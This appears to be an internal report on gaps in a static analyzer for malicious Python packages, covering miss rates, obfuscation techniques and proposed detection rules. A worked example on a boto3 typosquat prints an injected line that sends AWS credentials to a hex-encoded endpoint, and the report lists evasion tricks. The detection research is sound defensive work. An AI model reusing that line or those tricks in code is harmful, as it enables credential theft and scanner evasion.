# Analyzer v1: gaps observed on real data

Analyzer v1 is frozen as the baseline. Changes go into a documented v1.1 only. Evidence: `real_dataset_behavior_breakdown.md`.

| # | Gap | Evidence |
|---|---|---|
| 1 | getattr-style indirection is not resolved | Evasion test: 2 of 13 variants succeeded (ASR 15.38%); 29 zero-finding packages contain `getattr` |
| 2 | Install-time behaviour outside setup.py | 529 package-versions have no setup.py; 384 use pyproject.toml; Install-Time rate 0.0% vs 94.3% when setup.py exists |
| 3 | Packages without Python source | 18 zero-finding package-versions contain no .py; odd files: .pyd, .pyc, .sh, .bin, .js, .so, .pth, .ps1, .bat, .dll |
| 4 | Python that fails to parse | 38 package-versions (partial analysis); reported as failed_static_analysis, not as a security category |
| 5 | Risky keywords present but unflagged | 52 zero-finding package-versions; see triage CSV |
| 6 | `distutils` setup not recognised (to verify) | `distutils` appears in 1 zero-finding packages |
| 7 | Supply-chain abuse (typosquatting) | Metadata/name based, cannot be found by AST analysis by design; owned by Person B's name-similarity feature |

Limits: static analysis only; indicators are not proof of malice; no benign baseline yet, so discrimination is unmeasured.

## Additional gaps from the annotation comparison and miss analysis

| # | Gap | Evidence |
|---|---|---|
| 8 | Obfuscation under-detected | Of 59 annotated "obfuscated = true" package-versions, analyzer v1 flagged Obfuscation in 21 (35.6%); 38 missed |
| 9 | Severity mapping: plain `setuptools.setup` is HIGH | Present in 69.3% of package-versions; it inflates "HIGH" to 87.0% of rows and will fire on legitimate packages. Proposed v1.1: informational for plain setup(), HIGH only for install-command overrides (19.3%) |
| 10 | Likely metadata-driven packages | 86 zero-finding package-versions have no risky keyword in their source and are mostly tiny placeholder or typosquat-style names. Hypothesis: maliciousness is in metadata, outside AST scope. To verify by manual reading |
| 11 | Keyword-level misses are not all real gaps | Crude keyword scan matches `re.compile(`, `open(`; real gap candidates are `getattr`, `importlib`, `pickle` |

## Worked example: amazon-boto@1.42.41 (typosquat of boto3, zero findings)

A full copy of boto3 with one injected line in `boto3/session.py`:
`AWSRequest(method='POST', url=bytes.fromhex(AWS_ENDPOINT).decode(), data=credentials.get_frozen_credentials()._asdict())`.
Analyzer v1 reported no finding for three independent reasons: (1) hex-encoded string via `bytes.fromhex(...).decode()` is not an obfuscation rule; (2) `get_frozen_credentials()` is not a recognised credential source; (3) the network call goes through `AWSRequest`, not requests/urllib/socket.
Lesson: a one-line payload inside a legitimate vendored library is invisible to keyword and indicator rules; it needs library-aware credential sources and a diff against the upstream release.

## Obfuscation misses on annotated samples (38 of 59 missed)

Techniques present in the missed package-versions: dynamic import via `__import__`/`importlib` (17), `chr()` building (13), base64 in forms v1 does not match (12), `exec`/`eval` of decoded strings (7), `\x` hex-escape runs (7), `getattr` (6), `join(map/chr)` (4), `[::-1]` reversal (3).
The misses cluster in a few campaigns (e.g. maratlib 10 versions, noblesse 6+), so versions overstate the number of distinct techniques.

### Proposed v1.1 (not applied; v1 stays frozen as the baseline)
1. Flag `''.join(chr(...))` and `bytes.fromhex(...)` followed by `exec`/`eval`/network use as Obfuscation.
2. Flag `__import__(...)` / `importlib.import_module(...)` with non-constant or decoded arguments as Dynamic Code Execution.
3. Flag long hex-escape and long encoded string literals.
Each rule must be checked against the benign scan first: `chr()` and `importlib` are common in legitimate code (e.g. bitensor-cli).
